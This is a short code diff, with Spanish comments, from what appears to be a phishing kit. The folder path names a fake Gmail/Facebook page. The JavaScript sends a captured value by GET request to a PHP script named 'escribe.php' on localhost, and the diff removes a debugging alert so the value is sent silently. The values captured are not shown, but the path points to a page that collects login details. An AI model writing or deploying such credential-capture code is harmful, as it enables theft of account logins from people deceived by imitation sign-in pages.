@@ -24,7 +24,6 @@ var http = getXMLHTTPRequest(); // creo una instancia del objeto XMLHTTPRequest.
 
 function enviarvariable(variable) { // funcion encargada de inviar la variable al archivo php llamado index.php.
     var url = 'http://localhost/php/gmailFake/facebook/escribe.php?variable=' + variable; // creación de la URL.
-    alert(variable);
     http.open(\"GET\", url, true); // fijando los parametros para el envío de datos.
     http.onreadystatechange = handler; // Qué función utilizar en caso de que el estado de la petición cambie.
     http.send(null); // enviar petición.
